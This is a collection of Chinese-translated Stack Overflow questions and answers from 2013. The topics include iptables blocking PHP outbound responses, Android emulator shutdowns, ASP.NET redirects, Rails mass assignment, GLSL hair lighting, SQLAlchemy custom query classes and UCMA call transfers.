使用以下规则，php 不能`redirect`生成另一个文件。它在到达`header("Content-type: video/x-flv"); header("Location:" . $VIDEO);` 或可能`get_headers();`在我的 php 脚本上时冻结。

我的iptables：

```
 iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         
ACCEPT     tcp  --  anywhere             anywhere            tcp dpt:22151 
ACCEPT     tcp  --  anywhere             anywhere            tcp dpt:http 
ACCEPT     all  --  anywhere             anywhere            
ACCEPT     tcp  --  anywhere             anywhere            tcp dpt:webcache 
ACCEPT     tcp  --  anywhere             anywhere            tcp spt:webcache 
ACCEPT     tcp  --  anywhere             anywhere            tcp spt:http 
DROP       all  --  anywhere             anywhere            

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination 
```

我试过的

```
iptables -A INPUT -p ICMP --icmp-type 8 -j ACCEPT 
```

一旦我删除`DROP all -- anywhere anywhere`一切正常。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:12:12.840

当您使用 时`get_headers()`，您的脚本会建立一个传出 HTTP 连接。*您需要通过允许已建立*的会话来允许回复流量返回。

```
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT 
```

请参阅[此处](https://help.ubuntu.com/community/IptablesHowTo#Allowing_Established_Sessions)了解更多信息

# android - Android模拟器启动后关闭

> ID：15936074
> 
> 赞同：1
> 
> 时间：2013-04-10T20:48:07.597
> 
> 标签：android

你好！

我在让我的 android 模拟器工作时遇到问题。在我运行我的 android 应用程序项目后，模拟器启动，但它没有显示我的应用程序，而是显示以下内容：“关机。正在关机......”然后屏幕变黑。我无法启动我的应用程序或在模拟器中执行任何操作。

可能是什么问题？我的目标 SDK 是 1.5，我选择的设备是 Nexus One。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:04:50.123

它以前有效吗？是否尝试擦除用户数据？（avd 启动选项）

//edit：我认为Fuad是错误的：如果将ramSize更改为1024M或1024MB，则虚拟设备的RAM量只是设置为256MB

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-10T21:06:05.330

起初我在使用 android SDK 时遇到了这样的问题......检查这可能对你有帮助：

> (YourWindowsDrive)C:\Users\YourLoginName(我的是 Fuad)\.android\avd\App.avd(这个 App.avd 是一个文件夹，我的 avd 使用的名称)

然后在文件夹 U 中看到“config.ini”。打开它并将“hw.ramSize=1024”（我的是 1024，也许你的不同）更改为：

> hw.ramSize=1024M

# asp.net - 如何在屏幕上发送消息并重定向到不同的页面

> ID：15936081
> 
> 赞同：0
> 
> 时间：2013-04-10T20:48:38.180
> 
> 标签：asp.net

前段时间，我询问“如何发送警报并重新加载页面”，我在[这里](https://stackoverflow.com/a/15616006/1919644)
找到了答案 但是现在我需要发送此警报/确认消息，例如`New Registration Successfully done`并重定向到不同的页面。
而且我不知道如何......我以前的方式只会重新加载当前页面，如果我做了一个`Response.Redirect("PageName.aspx");`它不会显示警报。
我能做什么？

**更新**
现在，我发现了这个`window.location.href = 'pagina.aspx';`但我不知道这是否是一个好习惯或如何使用它，在代码隐藏中，这种方法不存在......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-10T21:11:41.480

您想从后面的代码加载脚本。

## 没有 Ajax 的页面

```
protected void Submit_Click(object sender, EventArgs e)
{
   // Do something 
   Page.ClientScript.RegisterStartupScript(this.GetType(), "redirect script", 
   "alert('New registration successfully done!'); location.href='pagina.aspx';", 
   true);
} 
```

## 使用 Ajax 的页面

```
protected void Submit_Click(object sender, EventArgs e)
{
   // Do something
   ScriptManager.RegisterStartupScript(Page, Page.GetType(), "redirect script", 
   "alert('New registration successfully done!'); location.href='pagina.aspx';", 
   true);
} 
```

# ruby-on-rails - 为什么rails引擎（3.2.12）想要mass_assign不在新表单上的字段？

> ID：15936084
> 
> 赞同：0
> 
> 时间：2013-04-10T20:48:46.993
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rspec2

在我们的`rails 3.2.12 engine`中，有一个`model misc_definition`. 这是 misc_definition 模型中的一行：

```
attr_accessible :brief_note, :for_which, :name, :ranking_order, :as => :role_new 
```

创建新的 misc_definition 的形式是：

```
<%= simple_form_for @misc_definition do |f| %>     
  <%= f.input :name, :label => name_label %>
  <%= f.input :brief_note, :label => "Brief Note:", :input_html => {:rows => 2} %> 
  <%= f.input :for_which, :input_html => {:value => @for_which}, :as => :hidden %>
  <%= f.input :ranking_order, :label => 'Ranking Index', :placehoder => '1, 2, 3 ...'%> 
  <%= f.button :submit, 'Save' %>  
<% end %> 
```

上面的表格中没有`active`新的 misc_definition。中的错误`rspec`是：

```
ActiveModel::MassAssignmentSecurity::Error←[0m:
       ←[31mCan't mass-assign protected attributes: active←[0m
←[36m     # ./app/controllers/projectx/misc_definitions_controller.rb:29:in `new'←[0m 
```

控制器中的第 29 行是：

```
@misc_definition = Projectx::MiscDefinition.new(params[:misc_definition], :as => :role_new) 
```

`active`添加到列表时错误消失，`:role_new's` `attr_accessible`直到每个字段都添加到`attr_accessible`列表中。但是，在常规的 rails 应用程序中，如果该字段不在 列表中，则没有问题`attr_accessible`，rails 应用程序只是跳过为该字段分配任何值。`mass_assignment`但是在 Rails 引擎中，它会为任何不在新表单上的字段抛出错误。

有人知道 mass_assign 错误`rails engine`吗？它是一个错误`rails engine`吗？谢谢。

# c++ - 在字符串中搜索模式

> ID：15936085
> 
> 赞同：0
> 
> 时间：2013-04-10T20:48:53.223
> 
> 标签：c++

是否可以在 C++ 中的 std::string 中搜索某些模式？

我知道`find()`，`find_first_of()`等等，但我正在寻找更高级的东西。

例如，采用以下 XML 行：`<book category="fantasy">Hitchhiker's guide to the galaxy </book>`

如果我想使用它来解析它，`find()`我可以这样做：

```
string line = "<book category=\"fantasy\">Hitchhiker's guide to the galaxy </book>"

size_t position = line.find('>');
std::string tmp = line.substr(0,position);
position = tmp.find(' ');
std::string node_name = tmp.substr(0, position);
std::string parameters = tmp.substr(position+1);

... 
```

这感觉非常“糟糕”且效率低下。如果我有多个标签相互嵌套，它也会失败，如下所示：

`<bookstore><book category=\"fantasy\">Hitchhiker's guide to the galaxy </book></bookstore>`

有没有办法搜索模式，比如搜索`<*>`where`*`表示任意数量的任意值的字符，获取 的值`*`，将其拆分为参数和节点名称，然后搜索`</nodename>`并获取介于`<nodename>`和之间的值`</nodename>`？

# android - 选择一项时Android GridView重绘所有项目

> ID：15936086
> 
> 赞同：1
> 
> 时间：2013-04-10T20:49:03.060
> 
> 标签：android, android-layout

我有一个 GridView，其中所有项目都具有 imageView。选择一个时，我看到所有项目都刷新了，因为每个项目都有 getView 调用。为什么会发生这种情况？我看到 GridView 每次都会刷新。下面是调用堆栈。

```
getView
obtainView:AsbsListView
makeAndAddView: GridView
makeRow:GridView
fillDown:GridView
fillSpecific:GridView
layoutChildren:GirdView
onLayout: AbsListView
layout:View
layout:ViewGroup
onLayout:RelativeLayout
....

    <GridView
    android:id="@+id/my_gridview"
    android:layout_gravity="center_horizontal"
    android:fadingEdge="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:visibility="visible"
    android:numColumns="5"
    android:verticalSpacing="1dp"
    android:horizontalSpacing="1dp"
    android:background="@android:color/black"
    android:listSelector="@color/TEST_RED"
    android:fadeScrollbars="false"
    android:focusable="false"
    android:splitMotionEvents="false"
    android:choiceMode="singleChoice"
    android:layout_below="@+id/loading"
    android:scrollbarStyle="insideOverlay"/> 
```

onItemClick 不会做 invalidateViews。它实际上什么也没做。

# matlab - 从字节接收Matlab中的浮点数

> ID：15936090
> 
> 赞同：0
> 
> 时间：2013-04-10T20:49:06.240
> 
> 标签：matlab, floating-point

我想通过串行 COM 向 Matlab 发送一个浮点数并将其解释为单精度浮点数。

我可以将数据作为字节数据包通过串行发送。

所以在发送方我将 32 位浮点数移位 8，将其屏蔽并发送

```
(byte)((number >> 8) & 0x000000FF)
(byte)((number >> 16) & 0x000000FF)
...
\r\n (line termination) 
```

现在，在 Matlab 上，我连接到 COM 并使用`fscanf(s,'%f')`where s 是串行实例来接收。它读取字节直到终止行。

现在，问题是 Matlab 上的输出与我发送的不一样。我相信问题在于不同的浮点表示或不同的发送顺序。

例如。如果我发送小数`1.2 (0x3f99999a)`，Matlab 打印`1.5315e+010`

我可能做错了什么？

编辑：

Matlab fscanf [http://www.mathworks.co.uk/help/matlab/ref/fscanf.html](http://www.mathworks.co.uk/help/matlab/ref/fscanf.html)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T20:56:10.977

当数据是二进制时，请尝试`fread`代替。`fscanf`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-11T08:14:57.547

默认情况下`number`是 64 位的 double 类型。您应该为 64 位而不是 32 位执行移位。否则，您可以将数字声明为 uint32 类型并进行 32 位移位。

# javascript - 在 Meteor 中关闭文件监视

> ID：15936091
> 
> 赞同：7
> 
> 时间：2013-04-10T20:49:10.333
> 
> 标签：javascript, multithreading, meteor

我正在构建一个存储用户生成图像的应用程序。这些图像在整个应用程序中以画廊类型视图使用。它们还经常更新/重新生成。

我遇到的问题是当生成新图像时，我将其存储在公共目录中。这会导致流星服务器“重新启动”。

有没有办法关闭文件观看？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-11T13:41:55.173

1.  我认为目前不可能

2.  即使您可以停下来观看它也无法解决您的问题

当流星检测到更改时，它会重建服务器（.meteor/local/build/）并从那里提供服务。

公共文件夹发送到那里：“.meteor/local/build/static/”

在您停止关注更新的情况下，您也将停止查看客户可以访问的内容的变化。

我发现这种特殊情况可以通过用另一种处理静态资产的工具替换流星来解决。

我有一个流星应用程序来处理数据和文件同步，但我还保留了一个 Apache 作为文件分发管理器。

我的流星应用程序很小，资产可以发送到其他地方（例如：投入生产时的 S3）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-22T08:37:10.017

我刚刚在这个网站上找到了一个类似问题的答案，如果您还没有找到解决方案，我认为这可能会有所帮助。

> 我终于找到了解决方法。我把所有东西都放在 /public/lib/. 然后，/usr/lib/meteor/app/run.js 的第 286 行，我添加了我不希望 Meteor 观看的文件夹：self.exclude_paths = [ path.join(app_dir, '.meteor', ' local'), path.join(app_dir, 'public', 'lib') ]; 这样我就可以在 lib 中拥有尽可能多的文件，并且它们不会减慢所有速度。包含路径是“/lib/dojo/dojo.js”。

通过[马修](https://stackoverflow.com/users/1528917/mathieu)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-28T21:05:21.273

我最终将文件导出到 S3 存储桶，这样它就不会影响 Meteor 观看。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-12-01T00:53:12.397

我也喜欢对中小型项目使用开发模式，将文件保存到 /public 是个糟糕的主意。

Recommand [Meteor-Files](https://github.com/veliovgroup/Meteor-Files) 将所有文件（如 json 数据）保存到 mongodb 或 s3 中，并像本地文件一样使用它。

# delphi - EncdDecd 对 DecodeBase64 有限制吗？

> ID：15936093
> 
> 赞同：2
> 
> 时间：2013-04-10T20:49:22.177
> 
> 标签：delphi, delphi-xe2

你可以传入多大的 Base64 字符串有限制吗？

我正在使用以下内容，当我的图像被创建时，它缺少底部的一部分。我看到 BufferLen 约为 44000，但 DecodeBase64 返回大约 24000 个项目的数组。

```
BufferLen := (Length(JVal) * 4) div 3;
SetLength(PtrB, BufferLen);
PtrB := DecodeBase64(AnsiString(JVal));

JStream := TStringStream.Create(PtrB);
Jpeg := TJPEGImage.Create;
Jpeg.LoadFromStream(JStream);
Self.JPG := Jpeg; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:05:48.640

`AnsiString`除了使用数据类型强加的限制之外，Soap.EncdDecd 单元中的代码没有大小限制。

这个成功编码然后解码一个 100MB 字符串的程序证明了这一点：

```
{$APPTYPE CONSOLE}

uses
  Soap.EncdDecd;

var
  i: Integer;
  plain, encoded: string;

begin
  SetLength(plain, 100*1024*1024);
  for i := 1 to Length(plain) do
    plain[i] := Chr(32+Random(80));
  encoded := EncodeString(plain);
  if plain=DecodeString(encoded) then
    Writeln('passed')
  else
    Writeln('failed');
  Readln;
end. 
```

您的问题几乎可以肯定在于您的代码而不是`EncdDecd`单元。

您的代码可能会更简单一些。例如：

```
JStream := TBytesStream.Create(DecodeBase64(JVal));
Jpeg := TJPEGImage.Create;
Jpeg.LoadFromStream(JStream); 
```

# ios6 - CATransform3D 未在自定义 UICollectionViewFlowLayout 中正确应用

> ID：15936104
> 
> 赞同：1
> 
> 时间：2013-04-10T20:50:01.013
> 
> 标签：ios6, uicollectionview, uicollectionviewcell, catransform3d, uicollectionviewlayout

我对自定义 UICollectionViewFlowLayout 有一个奇怪的问题，我的单元格包含一个 imageView，我对我的单元格应用了缩放效果......但是我认为我在缩放效果上做错了，这很奇怪，因为我的单元格得到正确缩放，问题是某些单元格的 imageView 不是。

这是此问题的相关代码（我认为），（请注意，如果我删除方法：`- (NSArray *)layoutAttributesForElementsInRect:(CGRect)rect`或 CATransform3DMakeScale，问题似乎不会出现。）

```
///// UICollectionViewController.m

- (UICollectionViewCell *)collectionView:(UICollectionView *)collectionView cellForItemAtIndexPath:(NSIndexPath *)indexPath
{
    HICollectionViewCell *cell = (HICollectionViewCell *)[collectionView dequeueReusableCellWithReuseIdentifier:COLLECTION_VIEW_CELL_ID forIndexPath:indexPath];
    [self customizeCell:cell atIndexPath:indexPath];
    return cell;
}

#pragma mark - CollectionView FlowDelegate

- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout*)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath
{
    return CGSizeMake(200.0f, 200.0f);
}

#pragma mark - "Private" Methods

- (void)customizeCell:(HICollectionViewCell *)cell atIndexPath:(NSIndexPath *)indexPath
{
    UIImageView *view = (UIImageView *)[cell.contentView viewWithTag:kCollectionViewCellSubViewTag_imgView];
    if (!view.image) {
        view.image = [UIImage imageNamed:@"placeholder.png"];
    }
} 
```

自定义布局继承自 UICollectionViewFlowLayout

```
/////// CustomLayout.m

static const CGFloat ACTIVE_DISTANCE = 200.0f;
static const CGFloat ZOOM_FACTOR = 0.3f;

- (id)init
{
    if(self = [super init]) {
        self.itemSize = CGSizeMake(ITEM_SIZE, ITEM_SIZE);
        self.scrollDirection = UICollectionViewScrollDirectionHorizontal;
        self.sectionInset = UIEdgeInsetsMake(200.0f, 0.0f, 200.0f, 0.0f);
        self.minimumLineSpacing = 50.0f;
    }

    return self;
}

- (BOOL)shouldInvalidateLayoutForBoundsChange:(CGRect)newBounds
{
    return YES;
}

- (NSArray *)layoutAttributesForElementsInRect:(CGRect)rect
{
    NSArray *attributes = [super layoutAttributesForElementsInRect:rect];
    CGRect visibleRect;
    visibleRect.origin = self.collectionView.contentOffset;
    visibleRect.size = self.collectionView.bounds.size;

    for (UICollectionViewLayoutAttributes *attribute in attributes) {
        if (CGRectIntersectsRect(attribute.frame, rect)) {
            CGFloat distance = CGRectGetMidX(visibleRect) - attribute.center.x;
            CGFloat normalizedDistance = distance / ACTIVE_DISTANCE;

            // Apply a zoom factor to cells within ACTIVE_DISTANCE
            if (ABS(distance) < ACTIVE_DISTANCE) {
                CGFloat zoom = 1.0f + ZOOM_FACTOR * (1.0f - ABS(normalizedDistance));
                attribute.transform3D = CATransform3DMakeScale(zoom, zoom, 1.0);
                attribute.zIndex = round(zoom);
            }
        }
    }

    return attributes;
} 
```

随着 FlowLayout 的出现，一切看起来都很好。

![图 1](https://i.stack.imgur.com/b1Gjn.png)

然后我开始滚动，我注意到右侧单元格的背景层开始炫耀（**背景颜色为橙色**）

![图 2](https://i.imgur.com/o5dllsS.png)

如您所见，在两个单元格之后，第三个单元格（开始出现，再次看起来正常）。

![图 3](https://i.imgur.com/IFL9dHb.png)

也许这是单元队列和出队的问题（以及被重用的 imageView 还是什么？）。

# ruby-on-rails - 按模型的belongs_to关系查询排序

> ID：15936105
> 
> 赞同：1
> 
> 时间：2013-04-10T20:50:03.073
> 
> 标签：ruby-on-rails, ruby-on-rails-3, postgresql, activerecord, ruby-on-rails-3.2

我有一本模型书，里面有很多份。

Copy 属于 Book 也属于 School，它有很多份。

我想查询与学校相关的书籍并按份数排序，但我对如何处理当前的关系有点迷茫。

书籍模型包含副本的数据，如标题、作者等，副本就像书籍的物理记录。

对于组织这种关系的任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T20:54:06.583

```
Book.joins(:copies)
    .where("copies.school_id = ?", school_id)
    .order("COUNT(copies.id)") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:09:42.593

我不敢在 ActiveRecord 中给你一个答案，但下面是 SQL 中可能是一个合理的答案：

```
 SELECT book.name,
         school.id,
         COUNT(copy.*) number_of_copies
    FROM book
    JOIN copy on copy.book_id = book.id
    JOIN school on copy.school_id = school.id
GROUP BY school.id,
         book.name
ORDER BY number_of_copies 
```

这取决于您的表格以某种方式构建。在我看来，学校不会有书籍，而是书籍的*副本*，所以我认为`copy`table 应该有 a `school_id`and`book_id`并且`book`nor`school`表不应该有外国参考。

# opengl - 如何使用 GLSL 着色器使用 OpenGL 在头发颗粒上均匀应用亮度？

> ID：15936107
> 
> 赞同：3
> 
> 时间：2013-04-10T20:50:05.540
> 
> 标签：opengl, shader, particle-system, geometry-shader

我使用头发粒子系统使用 Blender 2.66 创建了一个发型。这看起来像这样：

![在此处输入图像描述](https://i.stack.imgur.com/BHNcX.png)

如您所见，亮度已应用于线条片段。转换后，我已将发型网格导出为 OBJ 文件格式。我在我的程序中解析了它，渲染看起来像这样：

![在此处输入图像描述](https://i.stack.imgur.com/ebm4i.png)

粒子已绘制为 GL_LINES（在我的 OBJ 文件中，每个面有 2 个顶点）。

在另一个测试程序中，我想用一个简单的线段来测试亮度。这是我的顶点缓冲区：

```
static GLfloat vertices[6] =
{
    0.000000f, 0.000000f, -2.000000f,
    0.000000f, 0.000000f, 2.000000f
};

static GLfloat normals[6] =
{
    0.000000f, 1.000000f, 0.000000f,
    0.000000f, 1.000000f, 0.000000f
};

static GLfloat colors[6] =
{
    0.000000f, 0.000000f, 1.000000f,
    0.000000f, 0.000000f, 1.000000f
}; 
```

结果（线在原点垂直于X轴旋转->我调用glLineWidth（5.0f）以获得更好的可见结果）：

![在此处输入图像描述](https://i.stack.imgur.com/79V83.png)

通过实时动画，我可以看到亮度是正确的，但只是在线条的特定“一侧”。这是正常的，因为一条线段应该有无限的法线，而我只有两条法线（每个顶点一个）。我想确切地说这两个法线是方程平面的法线 Y = 0 -> n(0.0, 1.0, 0.0)。所以我想知道是否可以为每个顶点添加多个法线？我相信 OpengL 做不到。但也许另一种方式是可能的。这是一张图，解释了我想做什么来计算线段每个部分的正确亮度：

![在此处输入图像描述](https://i.stack.imgur.com/xALWf.png)

就像您在第一张图片上看到的那样，Blender 可以在线段上实时计算亮度。此外，这张图片上存在 OpenGL 渲染。所以我确信这是可能的。我尝试重复相同的线段坐标两次，但对于第二行，我应用了相反的法线 n2(0.0, -1.0, 0.0) 但它不起作用。“另一面”是“黑暗的”。两个多边形也是一样的。目前，我使用 GLSL 着色器。我认为使用几何着色器或镶嵌着色器等特殊着色器是可能的。也许需要 CUDA 语言。但我不确定。

有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:19:19.393

这是一个复杂的话题。您应该首先阅读[Marschner 2003 年](http://www.cs.cornell.edu/~srm/publications/SG03-hair-abstract.html)关于头发照明的论文。一旦您感到困惑，请查看[nvidia](http://http.developer.nvidia.com/GPUGems2/gpugems2_chapter23.html)对此模型的解释（第 23.3 节，头发着色），其中包括漂亮的图表和着色器代码。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-10T22:42:11.090

ananthonline 已经为您提供了一些参考资料，但对于简单的线束照明模型而言，这些参考资料完全是多余的。

如果您的要求不那么先进，您可以将 Phong 照明模型应用于股线。您可能会问“等等，股线没有法线，但您需要 Phong 的法线？” 嗯，是的，也不是。一条线段有无数条法线，也称为平面。或者换句话说，线股本身是平面的法线。

phong 模型从朗伯散射模型的假设开始，即入射角越“垂直”，它变得越亮。描述这个的数学是

```
I(phi) = I_max * cos( phi ) 
```

或者，通过用向量替换 phi 并且`cos( angle(↑a,↑b) ) = ↑a · ↑b`在哪里`||↑a|| = ||↑b|| = 1`

```
I(↑a, ↑b) = I_max * ↑a · ↑b 
```

现在让`↑c · ↑b = 0`，在哪里`||↑c|| = 1`，然后`↑a · ↑b = 1 - ↑a · ↑c`。但是`↑c · ↑b = 0`是正常的定义。`↑b`这意味着对于光源方向和方向的线段，`↑c`您可以将强度写为

```
I(↑b, ↑c) = I_max * (1 - ↑b · ↑c) 
```

这就是线条的 Phong 照明模型。碰巧这也正是 Blender 所做的。

### *更新*：镜面反射

您只需要眼睛位置来计算镜面反射。您也可以这样做，假设线束的法线是垂直于线束的光方向矢量。再次让`↑b`线段`↑c`的方向和朝向光的方向。`↑n`然后应用 Gram-Schmidt 正交归一化方法，您可以通过以下方式得出原位法线

```
↑n = normalize(↑c - ↑b·↑c) 
```

使用它，您可以构建通常的一组

```
- vertex position
- vertex "normal"
- light direction
- light half direction 
```

在一个线链顶点着色器中并将其传递给一个常规的 Phong 片段着色器并像往常一样进行数学运算。

# python - SQLAlchemy - 你可以向查询对象添加自定义方法吗？

> ID：15936111
> 
> 赞同：35
> 
> 时间：2013-04-10T20:50:21.497
> 
> 标签：python, sqlalchemy

有没有办法为查询对象创建自定义方法，这样你就可以做这样的事情？

```
User.query.all_active() 
```

`all_active()`本质上在哪里`.filter(User.is_active == True)`

并且能够过滤掉它？

```
User.query.all_active().filter(User.age == 30) 
```

* * *

## 回答 #1

> 赞同：60
> 
> 时间：2013-04-12T02:22:59.033

您可以对基`Query`类进行子类化以添加自己的方法：

```
from sqlalchemy.orm import Query

class MyQuery(Query):

  def all_active(self):
    return self.filter(User.is_active == True) 
```

然后，您在创建会话时告诉 SQLAlchemy 使用这个新的查询类（[此处的文档](http://docs.sqlalchemy.org/en/latest/orm/session.html#sqlalchemy.orm.session.sessionmaker)）。从您的代码看来，您可能正在使用 Flask-SQLAlchemy，因此您可以按如下方式进行：

```
db = SQLAlchemy(session_options={'query_cls': MyQuery}) 
```

否则，您会将参数直接传递给`sessionmaker`：

```
sessionmaker(bind=engine, query_cls=MyQuery) 
```

到目前为止，这个新的查询对象并不那么有趣，因为我们`User`在方法中对类进行了硬编码，所以它不适用于其他任何东西。更好的实现将使用查询的底层类来确定应用哪个过滤器。这有点棘手，但也可以做到：

```
class MyOtherQuery(Query):

  def _get_models(self):
    """Returns the query's underlying model classes."""
    if hasattr(query, 'attr'):
      # we are dealing with a subquery
      return [query.attr.target_mapper]
    else:
      return [
        d['expr'].class_
        for d in query.column_descriptions
        if isinstance(d['expr'], Mapper)
      ]

  def all_active(self):
    model_class = self._get_models()[0]
    return self.filter(model_class.is_active == True) 
```

最后，动态关系（如果有的话）不会使用这个新的查询类。为了让那些也使用它，您可以在创建关系时将其作为参数传递：

```
users = relationship(..., query_class=MyOtherQuery) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-04-18T07:40:22.143

这对我来说很好

```
class ParentQuery(Query):
    def _get_models(self):     
        if hasattr(query, 'attr'):
            return [query.attr.target_mapper]
        else:
            return self._mapper_zero().class_

    def FilterByCustomer(self):
        model_class = self._get_models()
        return self.filter(model_class.customerId == int(g.customer.get('customerId')))

class AccountWorkflowModel(db.Model):
    query_class = ParentQuery
    ................. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-09-23T07:47:22.140

要提供一个自定义方法，该方法将被所有从特定父级继承的模型使用，首先如前所述从 Query 类继承：

```
from flask_sqlalchemy import SQLAlchemy, BaseQuery
from sqlalchemy.inspection import inspect

class MyCustomQuery(BaseQuery):
    def all_active(self):
        # get the class
        modelClass = self._mapper_zero().class_
        # get the primary key column
        ins = inspect(modelClass)
        # get a list of passing objects
        passingObjs = []
        for modelObj in self:
            if modelObj.is_active == True:
                # add to passing object list
                passingObjs.append(modelObj.__dict__[ins.primary_key[0].name])
        # change to tuple
        passingObjs = tuple(passingObjs)
        # run a filter on the query object
        return self.filter(ins.primary_key[0].in_(passingObjs))

# add this to the constructor for your DB object
myDB = SQLAlchemy(query_class=MyCustomQuery) 
```

这是针对flask-sqlalchemy的，人们在寻找这个答案时仍然会来到这里。

# ucma - 如何使用 UCMA 进行有人值守呼叫转移

> ID：15936113
> 
> 赞同：0
> 
> 时间：2013-04-10T20:50:24.953
> 
> 标签：ucma

我正在努力在我构建的 UMCA IVR 应用程序中进行呼叫转移。这不使用 Lync。

本质上，我有一个来自外部用户的既定电话，作为 IVR 应用程序的一部分，他们选择了一个要转移的选项。此转移是到配置的外部号码（即：我们的现场接线员）。我要做的是将原始呼叫者转移到外线号码，如果建立有效转移，我想终止原始呼叫。如果未建立传输，我想将控制权发送回 IVR 应用程序以优雅地处理此问题。

我的问题是建立传输时我的 EndTransferCall 没有受到打击。我原以为它会命中，设置我的 AutoResetEvent 并返回 True，然后在我的应用程序中我可以断开原始呼叫。有人可以告诉我我在这里缺少什么吗？

_call 是一个已建立的 AudioVideoCall。我的应用程序调用 Transfer 方法

```
private AutoResetEvent _waitForTransferComplete = new AutoResetEvent(false);

public override bool Transfer(string number, int retries = 3)
        {
            var success = false;
            var attempt = 0;

            CallTransferOptions transferOptions = new CallTransferOptions(CallTransferType.Attended);

            while ((attempt < retries) && (success == false))
            {
                try
                {
                    attempt++;

                    _call.BeginTransfer(number, transferOptions, EndTransferCall, null);

                    // Wait for the transfer to complete
                    _waitForTransferComplete.WaitOne();

                    success = true;
                }
                catch (Exception)
                {
                    //TODO: Log that the transfer failed
                    //TODO: Find out what exceptions get thrown and catch the specific ones
                }
            }

            return success;
        }

        private void EndTransferCall(IAsyncResult ar)
        {
            try
            {
                _call.EndTransfer(ar);
            }
            catch (OperationFailureException opFailEx)
            {
                Console.WriteLine(opFailEx.ToString());
            }
            catch (RealTimeException realTimeEx)
            {              
                Console.WriteLine(realTimeEx.ToString());
            }
            finally
            {
                _waitForTransferComplete.Set();
            }
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T16:10:12.307

如果不使用 _waitForTransferComplete 对象，行为是否相同？你不应该需要它——方法结束应该没问题，事件仍然会被引发。如果您强制同步行为以适应应用程序的其余部分，请尝试如下：

```
_call.EndTransfer(
  _call.BeginTransfer (number,transferOptions,null,null)
   ); 
```

我只是想知道如果在单个线程上运行或其他什么东西，这样的等待是否会导致问题......

# java - 如何组织一个java web项目？

> ID：15936115
> 
> 赞同：0
> 
> 时间：2013-04-10T20:50:34.703
> 
> 标签：java, javascript, web-applications, project-organization, file-structure

我正在使用 Java、JavaScript、html、css 和 MySQL 数据库创建一个项目。我没有使用任何内置工具，如 ant 或 maven。在与我的 JavaScript 和 servlet、jdbc 和其他文件进行交互时，我遇到了很多问题。谁能告诉我组织java web项目的最佳方式是什么？请不要告诉我使用 Ant 或 Maven 或任何其他内置工具。我找到了一个[答案](https://stackoverflow.com/questions/11926334/how-to-organize-source-files-of-java-program)，任何人都可以告诉我将我的文件结构放在这样的组织中的哪个位置。我当前的代码是这样的：

```
 - aarya(project name)   
        |
         - WEB-INF
                 |
        |         -web.xml
        -src
           |
          -pkg
           |
            -coreServlet.java
            -main.java
        |
        -html
            |
            - core.html
        |
        - css
             |
             -core.css

        |
        -javascript
                  |
                   -core.js
        |
        - lib
        |
        -index.html 
```

我在java和html和JavaScript交互方面面临很多问题，请告诉我最好的组织方式。请给出任何详细的链接或详细答案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:03:52.707

项目的结构并不重要。对于网络服务器而言，重要的是网络存档（战争）的结构。

您应该按照标准构建和存档您的战争文件

这是解释 Web 应用程序结构的[链接](http://docs.oracle.com/cd/E14571_01/web.1111/e13712/configurewebapp.htm#i161609)

# python - 使用python比较文本行（多个列表）

> ID：15936118
> 
> 赞同：1
> 
> 时间：2013-04-10T20:50:41.123
> 
> 标签：python

我有包含以下行的文本文件：

```
Cycle 0 DUT 2 Bad Block : 2,4,6,7,8,10,12,14,16,18,20,22,24,26,28
Cycle 0 DUT 3 Bad Block : 4,6,8,10,12,14,16,18,20,22,24,26
Cycle 0 DUT 4 Bad Block : 4,6,8,10,12,14,16,18,20,22,24,26
Cycle 1 DUT 2 Bad Block : 2,4,6,7,8,10,12,14,16,18,20,22,24,26,28
Cycle 1 DUT 3 Bad Block : 4,6,8,10,12,14,16,18,20,22,24,26,28,30,32 
```

我想将`Cycle 0 DUT 2`文本行（冒号后用逗号分隔的`Cycle 1 DUT 2`数字）与文本行（冒号后用逗号分隔的数字）进行比较并获取差异，然后将`Cycle 0 DUT 3`文本行与`Cycle 1 DUT 3`文本行进行比较并获取差异或唯一值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:01:40.003

我猜你想把事情`DUT`写到数字上：

```
import re
dut_data = {}

cycle_dut = re.compile('^Cycle\s+(\d)\s+DUT\s+(\d)\s+Bad Block\s*:\s*(.*)$')

with open(inputfile, 'r') as infile:
    for line in infile:
        match = cycle_dut.search(line)
        if match:
            cycle, dut, data = match.groups()
            data = [int(v) for v in data.split(',')]
            if cycle == '0':
                # Store cycle 0 DUT values keyed on the DUT number
                dut_data[dut] = data
            else:
                # Compare against cycle 0 data, if the same DUT number was present
                cycle_0_data = dut_data.get(dut)
                if cycle_0_data is not None:
                    # compare cycle_0_data and data here
                    print 'DUT {} differences: {}'.format(dut, ','.join([str(v) for v in sorted(set(cycle_0_data).symmetric_difference(data))])) 
```

